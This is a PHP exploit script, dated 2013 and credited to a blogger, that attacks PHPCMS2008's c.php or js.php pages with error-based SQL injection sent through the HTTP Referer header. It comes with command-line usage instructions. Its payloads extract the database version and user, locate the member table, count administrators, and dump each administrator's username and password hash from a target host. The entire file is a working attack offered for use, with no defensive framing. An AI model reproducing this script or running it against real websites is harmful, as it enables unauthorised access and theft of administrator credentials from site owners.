<?php
/**
 * Created BY 独自等待
 * Date : 13-5-29
 * Time : 下午2:40
 * FileName : phpcms2008_c.php
 * 欢迎访问独自等待博客www.waitalone.cn
 */
print_r('
+------------------------------------------------------+
             PHPCMS2008 c.php/js.php 注入EXP
             Site：http://www.waitalone.cn/
                Exploit BY： 独自等待
                  Time：2013-05-29
+------------------------------------------------------+
');
if ($argc < 4) {
    print_r('
+------------------------------------------------------+
Useage: php ' . $argv[0] . ' host path type
Host: target server (ip/hostname)
Path: path of phpcms
Type: type=1->c.php type=2->js.php
Example: php ' . $argv[0] . ' localhost /phpcms
+------------------------------------------------------+
    ');
    exit;
}
error_reporting(7);
//统计时间
$start_time = func_time();
$host = $argv[1];
$path = $argv[2];
$type = $argv[3];
switch ($type) {
    case 1:
        $url = '/c.php?id=1';
        break;
    case 2:
        $url = '/data/js.php?id=1';
        break;
    default:
        echo '请输入注入页面1或者2' . "\n";
        exit;
}
//数据库版本
$cmd1 = "' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
$db_ver = get_info($cmd1);
//数据库用户
$cmd2 = "' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
$db_user = get_info($cmd2);
//获取用户表
$cmd3 = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() and table_name like '%_member%' LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
$member = get_info($cmd3);
//获取管理员数量
$cmd4 = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,count(*),0x7e) FROM $member where groupid=1 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
$ad_count = get_info($cmd4);
//显示注入数据
if (preg_match('/MySQL Query/i', send_pack('\''))) {
    echo '数据库版本: ' . $db_ver . "\n";
    echo '数据库用户: ' . $db_user . "\n";
    echo '管理员个数: ' . $ad_count . "\n";
    //获取多个管理员
    foreach (range(0, ($ad_count - 1)) as $i) {
        $cmd5 = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,username,0x3a,password,0x7e) FROM $member where groupid=1 LIMIT $i,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
        echo '管理员' . $i . '-->' . get_info($cmd5) . "\n";
    }
} else {
    exit("报告大人，网站不存在此漏洞,请更换注入页面试试!\n");
}


//发送数据包函数
function send_pack($cmd)
{
	
    global $host, $path, $url;
    $data = "GET " . $path . "$url HTTP/1.1\r\n";
    $data .= "Host: $host\r\n";
    //$data .= "User-Agent: Baiduspider\r\n";
    $data .= "Referer: " . $cmd . "\r\n";
    $data .= "Connection: Close\r\n\r\n";
    $fp = @fsockopen($host, 80, $errno, $errstr, 10);
    //echo ini_get('default_socket_timeout');//默认超时时间为60秒
    if (!$fp) {
        echo $errno . '-->' . $errstr . "\n";
        exit('Could not connect to: ' . $host);
    } else {
        fwrite($fp, $data);
        $back = '';
        while (!feof($fp)) {
            $back .= fread($fp, 1024);
        }
        fclose($fp);
    }
    return $back;
}

//提取返回信息
function get_info($info)
{
    preg_match('/~(.*)~1/i', send_pack($info), $admin_match);
    if (preg_match('/charset=utf-8/i', send_pack($info))) {
        return iconv('utf-8', 'gbk//IGNORE', $admin_match[1]);
    } else {
        return $admin_match[1];
    }
}

//时间统计函数
function func_time()
{
    list($microsec, $sec) = explode(' ', microtime());
    return $microsec + $sec;
}

echo '脚本执行时间：' . round((func_time() - $start_time), 4) . '秒。';
?>